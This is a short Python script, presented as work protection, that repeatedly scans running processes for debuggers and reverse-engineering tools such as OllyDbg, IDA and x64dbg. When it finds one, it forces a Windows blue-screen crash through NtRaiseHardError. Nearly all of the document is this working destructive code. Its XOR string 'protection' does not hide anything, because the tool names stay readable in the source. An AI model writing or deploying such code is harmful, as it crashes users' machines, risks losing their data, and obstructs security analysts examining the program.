Universal Code To Protect My Work

#Runs a thread in program to scan if any debuggers are active aka Olly, IDA, Process Hacker, etc...

1. If one of the programs are found to be active, the program gives an instant BSOD.
2. Import "xor" to protect the strings from reversal


import os
import sys
import ctypes
import psutil
import time

# XOR Encryption Function
def xor_encrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

# List of Debugging Tools (Obfuscated)
debuggers = [
    xor_encrypt("ollydbg.exe", "X"), 
    xor_encrypt("ida64.exe", "X"), 
    xor_encrypt("processhacker.exe", "X"), 
    xor_encrypt("x32dbg.exe", "X"),
    xor_encrypt("x64dbg.exe", "X"),
    xor_encrypt("cheatengine.exe", "X"),
    xor_encrypt("windbg.exe", "X")
]

# Function to detect debuggers
def is_debugger_active():
    processes = [p.name().lower() for p in psutil.process_iter()]
    for enc_debugger in debuggers:
        if xor_encrypt(enc_debugger, "X") in processes:
            return True
    return False

# Function to trigger BSOD (Windows Only)
def trigger_bsod():
    if os.name == "nt":
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

# Run anti-debugging thread
def anti_debug_thread():
    while True:
        if is_debugger_active():
            print("Debugger detected! Triggering system crash...")
            trigger_bsod()
            sys.exit()
        time.sleep(5)

# Start Anti-Debugging Protection
if __name__ == "__main__":
    anti_debug_thread()
